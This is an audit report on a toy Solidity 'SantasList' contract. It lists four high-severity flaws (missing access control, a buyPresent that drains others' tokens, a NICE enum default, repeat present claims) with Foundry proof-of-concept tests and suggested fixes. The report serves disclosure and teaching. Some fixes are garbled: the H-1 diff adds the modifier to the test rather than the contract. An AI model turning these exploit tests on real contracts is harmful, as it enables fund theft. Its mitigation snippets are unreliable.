# [H-1]Access control


# DESCRIPTION
In function checkList there is no onlySanta modifier what leads to that everyone can call this function and set status itself whats break the whole protoclol beacuse even in natspec they said callable by onlysanta so when users can call it even if checkTwice exists santas doesnt know what the users first status list beacse there is no mapping for it so santas has to guess the users status.



# IMPRACT
Likelihood:

High, it will happens all the time, there is no modifier for this function so every use will see it.

Impact:
High, breaks the whole protocol it leads to santas cant mint present to anyone until he blind guess the user status.
# PROOF OF CONCEPT

 function testProofOfCodeAccessControl() public {
        vm.prank(user);//user should not be able to set status, only the santa should be able to.
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        assertEq(uint256(santasList.getNaughtyOrNiceOnce(user)), uint256(SantasList.Status.EXTRA_NICE));
    }
​
​
User can call the function.

# MITIGATION
1Add onlySantas modifier to this function.
2.Check if(i_santa == msg.sender)

- remove this code
-    function testProofOfCodeAccessControl() public
++   function testProofOfCodeAccessControl() public OnlySantas {
        vm.prank(user);//user should not be able to set status, only the santa should be able to.
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        assertEq(uint256(santasList.getNaughtyOrNiceOnce(user)), uint256(SantasList.Status.EXTRA_NICE));
    }
+ add this code


# [H-2] business logic in BuyPresent function, leads to drain user funds


# DESCRIPTION

In BuyPresent function occur critical exploti that leads to drains user funds by calling buyPresent fuction which has no access control, anyone can call it also the caller mint NFT hiself which also breaks the whole protocol.
# IMPRACT
Risk
Likelihood:

HIGH, It occurs everytiem user call function buyPresent with antoher user address as a parameter.

Impact:

HIGH, Drains all presentReveiver funds, also the caller benefit from this because he mints NTF for hiself

# PROOF OF CONCEPT
As we can see in this test user had 1e18 in funds in tokens after the function got called by an user his funds have been drained by 1e18 amount.
Also we can see that user who called this function got 1 NFT only for calling this function

function testProofOfCodeBuyPresentBusinessLogic() public {
        address user2 = makeAddr("user2");
        vm.startPrank(santa);
        santasList.checkList(user2, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user2, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();
        vm.startPrank(user2);
        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);
        santasList.collectPresent(); // user2 gets a EXTRA_NICE present whats mean that he will get 1e18 stantasTokens to his address.
        vm.stopPrank();
        uint256 user2TokenBalanceBefore = santaToken.balanceOf(user2);
        uint256 userNftBalanceBefore = santasList.balanceOf(user);
        vm.prank(user);
        santasList.buyPresent(user2);
        uint256 user2TokenBalanceAfter = santaToken.balanceOf(user2);
        uint256 userNftBalanceAfter = santasList.balanceOf(user);
        console.log("Receiver token balance before: ", user2TokenBalanceBefore);
        console.log(" Receiver token balance after: ", user2TokenBalanceAfter);
        console.log(" Giver NFT balance before: ", userNftBalanceBefore);
        console.log(" Giver NFT balance after: ", userNftBalanceAfter);
    }
​
​
[PASS] testProofOfCodeBuyPresentBusinessLogic() (gas: 218933)
Logs:
  Receiver token balance before:  1000000000000000000
   Receiver token balance after:  0
   Giver NFT balance before:  0
   Giver NFT balance after:  1

# MITIGATION
we should have added to SantasList.sol function _mintAndIncerementFOrUser(address user) internal {}(_safeMint(user,s_tokenCounter++)) then we call it in fucntion buyPresent that leads to burn msg.sender tokens and nft is minted to presentReceiver instead of msg.sender
- remove this code
  function buyPresent(address presentReceiver) external {
-        i_santaToken.burn(presentReceiver);
+        i_santaToken.burn(msg.sender);
-        _mintAndIncrement();;
​
+        _mintAndIncrementForUser(user);
}
    
+ add this code


# [H-3] All addresses are Nice by deafault

# DESCRIPTION
collectPresent function is supposed to be called by users that are considered NICE or EXTRA_NICE by Santa. This means Santa is supposed to call checkList function to assigned a user to a status, and then call checkTwice function to execute a double check of the status.

Currently, the enum Status assigns its default value (0) to NICE. This means that both mappings s_theListCheckedOnce and s_theListCheckedTwice consider every existent address as NICE. In other words, all users are by default double checked as NICE, and therefore eligible to call collectPresent function.

Vulnerability Details
The vulnerability arises due to the order of elements in the enum. If the first value is NICE, this means the enum value for each key in both mappings will be NICE, as it corresponds to 0 value.

# IMPRACT
The impact of this vulnerability is HIGH as it results in a flawed mechanism of the present distribution. Any unchecked address is currently able to call collectPresent function and mint an NFT. This is because this contract considers by default every address with a NICE status (or 0 value).

# PROOF OF CONCEPT
function testCollectPresentIsFlawed() external {
        // prank an attacker's address
        vm.startPrank(makeAddr("attacker"));
        // set block.timestamp to CHRISTMAS_2023_BLOCK_TIME
        vm.warp(1_703_480_381);
        // collect present without any check from Santa
        santasList.collectPresent();
        vm.stopPrank();
    }

# MITIGATION
I suggest to modify Status enum, and use UNKNOWN status as the first one. This way, all users will default to UNKNOWN status, preventing the successful call to collectPresent before any check form Santa:

enum Status {
        UNKNOWN,
        NICE,
        EXTRA_NICE,
        NAUGHTY
    }
After modifying the enum, you can run the following test and see that collectPresent call will revert if Santa didn't check the address and assigned its status to NICE or EXTRA_NICE :

    function testCollectPresentIsFlawed() external {
        // prank an attacker's address
        vm.startPrank(makeAddr("attacker"));
        // set block.timestamp to CHRISTMAS_2023_BLOCK_TIME
        vm.warp(1_703_480_381);
        // collect present without any check from Santa
        vm.expectRevert(SantasList.SantasList__NotNice.selector);
        santasList.collectPresent();
        vm.stopPrank();
    }


# [H-4]Nice or Extra nice are able to call collectPresent function multiple times


# DESCRIPTION
collectPresent function is callable by any address, but the call will succeed only if the user is registered as NICE or EXTRA_NICE in SantasList contract. In order to prevent users to collect presents multiple times, the following check is implemented:

       if (balanceOf(msg.sender) > 0) {
            revert SantasList__AlreadyCollected();
        }
Nevertheless, there is an issue with this check. Users could send their newly minted NFTs to another wallet, allowing them to pass that check as balanceOf(msg.sender) will be 0 after transferring the NFT.

Vulnerability Details
Let's imagine a scenario where an EXTRA_NICE user wants to collect present when it is Christmas time. The user will call collectPresent function and will get 1 NFT and 1e18 SantaTokens. This user could now call safetransferfrom ERC-721 function in order to send the NFT to another wallet, while keeping SantaTokens on the same wallet (or send them as well, it doesn't matter). After that, it is possible to call collectPresent function again as ``balanceOf(msg.sender)will be0` again.

# IMPRACT
The impact of this vulnerability is HIGH as it allows any NICE user to mint as much NFTs as wanted, and it also allows any EXTRA_NICE user to mint as much NFTs and SantaTokens as desired.

# PROOF OF CONCEPT
The following tests shows that any NICE or EXTRA_NICE user is able to call collectPresent function again after transferring the newly minted NFT to another wallet.

In the case of NICE users, it will be possible to mint an infinity of NFTs, while transferring all of them in another wallet hold by the user.

In the case of EXTRA_NICE users, it will be possible to mint an infinity of NFTs and an infinity of SantaTokens.

    function testExtraNiceCanCollectTwice() external {
        vm.startPrank(santa);
        // Santa checks twice the user as EXTRA_NICE
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();
​
        // It is Christmas time!
        vm.warp(1_703_480_381);
​
        vm.startPrank(user);
        // User collects 1 NFT + 1e18 SantaToken
        santasList.collectPresent();
        // User sends the minted NFT to another wallet
        santasList.safeTransferFrom(user, makeAddr("secondWallet"), 0);
        // User collect present again
        santasList.collectPresent();
        vm.stopPrank();
​
        // Users now owns 2e18 tokens, after calling 2 times collectPresent function successfully
        assertEq(santaToken.balanceOf(user), 2e18);
    }

# MITIGATION

SantasList should implement in its storage a mapping to keep track of addresses which already collected present through collectPresent function.
We could declare as a state variable :

    mapping(address user => bool) private hasClaimed;
and then modify collectPresent function as follows:

    function collectPresent() external {
        // use SantasList__AlreadyCollected custom error to save gas
        require(!hasClaimed[msg.sender], "user already collected present");
​
        if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
            revert SantasList__NotChristmasYet();
        }
​
        if (s_theListCheckedOnce[msg.sender] == Status.NICE && s_theListCheckedTwice[msg.sender] == Status.NICE) {
            _mintAndIncrement();
            hasClaimed[msg.sender] = true;
            return;
        } else if (
            s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE
                && s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE
        ) {
            _mintAndIncrement();
            i_santaToken.mint(msg.sender);
            hasClaimed[msg.sender] = true;
​
            return;
        }
        revert SantasList__NotNice();
    }